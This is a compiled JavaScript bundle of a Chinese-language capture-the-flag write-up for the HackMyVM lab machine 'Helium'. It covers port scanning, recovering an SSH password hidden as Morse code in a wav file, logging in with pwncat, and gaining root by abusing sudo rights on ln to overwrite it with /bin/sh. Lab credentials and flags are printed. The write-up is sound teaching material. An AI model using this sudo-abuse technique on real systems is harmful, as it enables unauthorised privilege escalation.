"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9324],{95480:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>t,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"HackMyVM/Machines/Helium/index","title":"Helium","description":"[Linux VM] [Tested on VirtualBox] created by || sml","source":"@site/docs/HackMyVM/Machines/Helium/index.md","sourceDirName":"HackMyVM/Machines/Helium","slug":"/HackMyVM/Machines/Helium/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Helium/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Helium/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Hash","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hash/"},"next":{"title":"Hommie","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Hommie/"}}');var i=a(74848),l=a(28453);const t={},r="Helium",c={},d=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u5206\u6790 wav \u6587\u4ef6",id:"\u5206\u6790-wav-\u6587\u4ef6",level:2},{value:"\u51ed\u636e\u5229\u7528",id:"\u51ed\u636e\u5229\u7528",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"root pwned",id:"root-pwned",level:2}];function o(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,l.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"helium",children:"Helium"})}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-11-22"}),(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 6c034ba16620358483d344f0572ad020"}),(0,i.jsx)(n.p,{children:"\u2620 Root // 159"}),(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 163"}),(0,i.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy. Tested on virtualbox."})]}),"\n",(0,i.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:a(90566).A+"",width:"1020",height:"687"})}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.110\n"})}),"\n",(0,i.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.110\nHost is up (0.00051s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 12f6555fc6fafb1415ae4a2b38d84a30 (RSA)\n|   256 b7ac876dc4f9e39ad46ee04fdaaa2220 (ECDSA)\n|_  256 fee805af234d3a822a649bf735e4444a (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-title: RELAX\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:0E:BF:60 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u76f4\u63a5\u8bbf\u95ee",src:a(75007).A+"",width:"1013",height:"601"})}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u770b\u539f\u59cb\u8fd4\u56de"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Vulny]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.110/\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html\nDate: Sat, 23 Dec 2023 14:54:31 GMT\nETag: W/"5fbaba1e-212"\nLast-Modified: Sun, 22 Nov 2020 19:21:02 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\n<title>RELAX</title>\n<!doctype html>\n<html lang="en">\n\n\x3c!-- Please paul, stop uploading weird .wav files using /upload_sound --\x3e\n\n<head>\n<style>\nbody {\n  background-image: url(\'screen-1.jpg\');\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: 100% 100%;\n}\n</style>\n    <link href="bootstrap.min.css" rel="stylesheet">\n    <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>\n\n<body>\n<audio src="relax.wav" preload="auto loop" controls></audio>\n</body>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u73b0\u53ef\u80fd\u5b58\u5728\u4ee5\u4e0b\u7528\u6237"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"paul\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u626b\u63cf\uff0c\u5e76\u7ed3\u5408\u5df2\u7ecf\u5f97\u5230\u4fe1\u606f\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.110/upload_sound/\nhttp://192.168.56.110/yay/\nhttp://192.168.56.110/bootstrap.min.css\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,i.jsx)(n.code,{children:"http://192.168.56.110/bootstrap.min.css"})," \u5f97\u5230\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"/yay/mysecretsound.wav\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u5206\u6790-wav-\u6587\u4ef6",children:"\u5206\u6790 wav \u6587\u4ef6"}),"\n",(0,i.jsxs)(n.p,{children:["\u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u540e\uff0c\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"audacity"})," \u8fdb\u884c\u67e5\u770b"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"audacity \u76f4\u63a5\u6253\u5f00",src:a(62639).A+"",width:"1920",height:"1050"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53d1\u73b0\u9891\u8c31\u56fe\u5b58\u5728\u4fe1\u606f\uff0c\u4f7f\u7528 ",(0,i.jsx)(n.a,{href:"https://morsecode.world/international/decoder/audio-decoder-adaptive.html",children:"Morse Code Adaptive Audio Decoder | Morse Code World"})," \u8fdb\u884c\u67e5\u770b"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"Morse Code World \u5728\u7ebf\u89e3\u6790",src:a(27997).A+"",width:"990",height:"741"})}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u73b0\u63d0\u53d6\u51fa\u6765\u4e24\u4efd\u5b57\u7b26\u4e32\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"ETAIE4SIET\ndancingpassyo\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7ed3\u5408\u4e0a\u6587\u5f97\u5230\u7684\u7528\u6237\u540d\uff0c\u6000\u7591\u662f SSH \u7684\u767b\u5f55\u51ed\u636e"}),"\n",(0,i.jsx)(n.h2,{id:"\u51ed\u636e\u5229\u7528",children:"\u51ed\u636e\u5229\u7528"}),"\n",(0,i.jsx)(n.p,{children:"\u5229\u7528\u4e00\u4e0b\u51ed\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"paul:dancingpassyo\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u767b\u9646\u6210\u529f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs paul@192.168.56.110\n[11:24:13] Welcome to pwncat \ud83d\udc08!                                                                                      __main__.py:164\nPassword: *************\n[11:24:20] 192.168.56.110:22: normalizing shell path                                                                   manager.py:957\n[11:24:21] 192.168.56.110:22: registered new host w/ db                                                                manager.py:957\n(local) pwncat$ back\n(remote) paul@helium:/home/paul$ whoami\npaul\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) paul@helium:/home/paul$ cat user.txt\nilovetoberelaxed\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for paul on helium:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser paul may run the following commands on helium:\n    (ALL : ALL) NOPASSWD: /usr/bin/ln\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53d1\u73b0\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c ",(0,i.jsx)(n.code,{children:"/usr/bin/ln"})," \u7a0b\u5e8f"]}),"\n",(0,i.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) paul@helium:/home/paul$ sudo ln -fs /bin/sh /bin/ln\n(remote) paul@helium:/home/paul$ sudo ln\n[](remote)[] []root@helium[]:[]/home/paul[]$ whoami\nroot\n"})}),"\n",(0,i.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"[](remote)[] []root@helium[]:[]/root[]$ cat root.txt\nilovetoberoot\n"})})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}},62639:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image_20231216-111632-843028986251410bc54cc9656441e3a4.png"},27997:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image_20231218-111805-50da1471388fccddeaee09e7e9a3dfde.png"},90566:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image_20231251-225142-e0fffea587dcfc46887b0d84bd136cc3.png"},75007:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image_20231253-225358-b2678dcf4879ba48995c9726363e2fb5.png"},28453:(e,n,a)=>{a.d(n,{R:()=>t,x:()=>r});var s=a(96540);const i={},l=s.createContext(i);function t(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);